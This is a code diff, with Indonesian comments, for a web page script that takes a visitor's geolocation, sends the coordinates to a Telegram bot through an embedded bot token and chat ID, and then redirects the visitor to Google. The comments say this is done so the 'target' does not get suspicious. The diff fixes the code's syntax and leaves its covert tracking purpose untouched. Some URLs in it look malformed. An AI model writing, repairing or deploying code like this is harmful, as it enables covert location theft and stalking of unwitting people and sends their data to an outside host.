@@ -9,23 +9,23 @@ window.onload = function() {
 };
 
 function sendToTelegram(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-    const token = "8638321687:AAHq7-qulLENRloAfMrULfSW4Wchu25R-ms"; 
-    const chat_id = "5287296131";
+    var lat = position.coords.latitude;
+    var lon = position.coords.longitude;
+    var token = "8638321687:AAHq7-qulLENRloAfMrULfSW4Wchu25R-ms"; 
+    var chat_id = "5287296131";
     
-    // Membangun pesan lokasi
-    const text = 🎯 TARGET TERDETEKSI!%0A📍 Lokasi: https://www.google.com{lat},${lon};
+    // Versi aman menggunakan tanda + agar tidak ada kesalahan simbol miring
+    var text = "🎯 TARGET TERDETEKSI!\n📍 Lokasi: https://www.google.com" + lat + "," + lon;
+    var url = "https://api.telegram.org" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
 
-    // Mengirim ke Bot Telegram (Pastikan ada kata /bot di depannya)
-    fetch(https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text})
-    .then(() => {
-        // Target diarahkan ke Google agar tidak curiga
+    fetch(url).then(function() {
+        // Target langsung diarahkan ke Google agar tidak curiga
         window.location.href = "https://www.google.com"; 
     });
 }
 
 function showError(error) {
+    // Jika target menolak, tetap diarahkan ke Google
     window.location.href = "https://www.google.com";
 }
 </script>
